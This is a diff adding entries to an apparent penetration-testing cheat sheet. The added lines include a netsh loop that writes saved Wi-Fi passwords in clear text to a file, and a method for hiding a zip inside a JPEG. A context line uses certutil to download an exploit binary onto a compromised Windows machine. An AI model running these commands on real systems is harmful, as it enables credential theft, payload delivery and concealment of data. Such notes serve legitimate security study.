@@ -142,6 +142,7 @@ You can do some great things with **_curl_**, it's worth going through it's man 
 * `curl -s <domain or IP> | grep "<form"` to discover which HTTP methods are available. `-s` is for _silent_ mode.
 
 * `curl -X DELETE <http://IP:PORT>` if you get a 200 OK that means that method is supported, you can try all the others as well like PUT, etc..
+* generating qr code of a website: `curl qrenco.de/https://google.com`
 
 ## dirb
 
@@ -748,6 +749,11 @@ GIF89a1
 * install **_virtualbox-guest_**: 
 * it has to be installed on the VM: `sudo apt update && sudo apt install -y --reinstall virtualbox-guest-x11 && sudo reboot -f`
 
+## Wifi show clear text password (Win)
+
+* `netsh show profile "wifi network name" key=clear`
+* Also we can save the above info into a file: `for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipassword.txt`
+
 ## wfuzz
 Enlists subdomains based on a wordlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.
 
@@ -757,6 +763,14 @@ Enlists subdomains based on a wordlist, here using top5000.txt from seclist. `--
 In case you have to bring a file over to the compromised Win machine. The last piece of information is how do you want to name the file you bring over.
 
 * `certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe`
+
+## Windows hide zip file as picture
+
+* zip up files first (nc_secrets.zip)
+* use photo to hide files in (cover.jpg)
+* name you new secret photo (secretphoto.jpg)
+* `copy /b cover.jpg+nc_secrets.zip secretphoto.jpg`
+* to encrypt files in the folder (in case someone finds it), go to your nc_secrets folder and: `cipher /E` before executing above commands
 
 ## Windows commands history check
 It's just like bash history in Linux.
